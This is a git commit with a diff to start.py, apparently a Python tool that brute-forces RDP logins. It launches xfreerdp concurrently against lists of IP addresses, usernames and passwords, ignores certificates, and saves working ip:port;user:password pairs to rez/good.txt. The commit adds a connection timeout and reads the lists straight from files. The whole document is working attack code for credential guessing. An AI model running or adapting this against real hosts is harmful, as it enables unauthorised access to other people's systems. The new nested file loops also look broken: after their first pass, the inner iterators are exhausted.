e58252c190c26a183460e61955d5169197bedeb3
3.13.1.5 <35502476+TheDevFromKer@users.noreply.github.com>
2018-12-02 21:03:32 +0100

    Improvements
    Python3.7, add timeout to RDP connect, no huge memory usage

--- start.py
+++ start.py
@@ -22,22 +22,22 @@ async def connect(sem, ip, user, password):
         global good, completed
 
         completed += 1
-        combo_num = len(ips)*len(users)*len(passwords)
-        print(f'Good: {good}; Completed: {completed}/{combo_num}', end="\r")
+        print(f'Good: {good}; Completed: {completed}', end="\r")
 
         try:
             r_agr = f"{fr_name} /v:{ip} /port:{port} /u:'{user}' " + \
-                    f"/p:'{password}' /cert-ignore +auth-only " + \
-                    '+compression /sec:nla'
+                     f"/p:'{password}' /cert-ignore +auth-only " + \
+                     '+compression /sec:nla'
 
             a = await run(r_agr, limit=0, stdout=DEVNULL, stderr=DEVNULL)
-            await a.communicate()
+            await asyncio.wait_for(a.communicate(), timeout=timeout)
 
             if a.returncode == 0:
                 good += 1
                 rez = f'{ip}:{port};{user}:{password}\n'
                 open('rez/good.txt', 'a', encoding='utf-8').write(rez)
-
+        except asyncio.TimeoutError:
+            a.kill()
             return
         except:
             return
@@ -47,11 +47,23 @@ async def start():
     tasks = []
     sem = asyncio.Semaphore(threads)
 
-    for user in users:
-        for passw in passwords:
-            for ip in ips:
-                task = asyncio.ensure_future(connect(sem, ip, user, passw))
-                tasks.append(task)
+    with open('data/ip.txt', "r", encoding="utf-8") as ips:
+        with open('data/users.txt', "r", encoding="utf-8") as users:
+            with open('data/passwords.txt', "r", encoding="utf-8") as passws:
+                for user in users:
+                    user = user.replace('\n', '')
+                    for passw in passws:
+                        passw = passw.replace('\n', '')
+                        for ip in ips:
+                            ip = ip.replace('\n', '')
+                            task = asyncio.ensure_future(
+                                                         connect(sem,
+                                                                 ip,
+                                                                 user,
+                                                                 passw
+                                                                 )
+                                                        )
+                            tasks.append(task)
 
         responses = asyncio.gather(*tasks)
 
@@ -59,23 +71,8 @@ async def start():
 
 
 if __name__ == "__main__":
-
-    # VARs
-
     threads = int(input('Threads: '))
+    timeout = int(input('Timeout: '))
     port = int(input('Port: ') or 3389)
 
-    with open('data/ip.txt', "r", encoding="utf-8") as ip_data:
-        ips = ip_data.read().splitlines()
-
-    with open('data/users.txt', "r", encoding="utf-8") as user_data:
-        users = user_data.read().splitlines()
-
-    with open('data/passwords.txt', "r", encoding="utf-8") as password_data:
-        passwords = password_data.read().splitlines()
-
-    # END VARs
-
-    loop = asyncio.get_event_loop()
-    future = asyncio.ensure_future(start())
-    loop.run_until_complete(future)
+    asyncio.run(start())
